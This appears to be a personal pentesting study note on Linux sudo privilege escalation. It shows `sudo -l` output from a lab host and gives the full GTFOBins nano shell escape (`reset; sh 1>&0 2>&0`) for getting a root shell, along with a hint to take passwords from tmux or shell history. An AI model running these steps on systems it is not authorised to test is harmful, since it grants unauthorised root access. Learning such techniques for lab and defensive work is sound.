---
tags: [technique, privesc, linux]
aliases: [sudo -l, GTFOBins]
---
# Sudo Abuse

> `sudo -l` shows which commands a user may run as root (or another user). Allowed binaries capable of a **shell escape** lead straight to root → [GTFOBins](https://gtfobins.github.io/).

## Check privileges
```bash
sudo -l
```
```
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, ...

User sadm may run the following commands:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
```

## Important defaults
| Entry                  | Meaning                                                                    |
| ---------------------- | -------------------------------------------------------------------------- |
| `NOPASSWD`             | command runs without a password                                            |
| `PASSWD`               | password required (→ maybe grab it from a tmux session / history)          |
| `timestamp_timeout=-1` | authenticate `sudo` once → **stays valid** (no password needed again)      |

## GTFOBins: nano as a root shell
If `nano` is allowed via `sudo`, start a command as root from within the editor:
```SHELL
sudo nano /etc/firewall.sh

Ctrl+R        (Read File)
Ctrl+X        (switches to "Execute Command")
reset; sh 1>&0 2>&0
```

| Part         | Meaning                                                        |
| ------------ | -------------------------------------------------------------- |
| `reset`      | reset the terminal to its normal state                         |
| `sh`         | start a shell (nano runs as root → the shell is root)          |
| `1>&0 2>&0`  | redirect stdout(1) + stderr(2) to stdin(0) = the terminal      |

=> Root shell. What `1>&0 2>&0` does exactly → [[File Descriptors]].

> [!tip] Other binaries
> Check every program allowed via `sudo` against [GTFOBins](https://gtfobins.github.io/) (`vi`, `less`, `tail`, `find`, `awk`, …) – many have a shell escape.
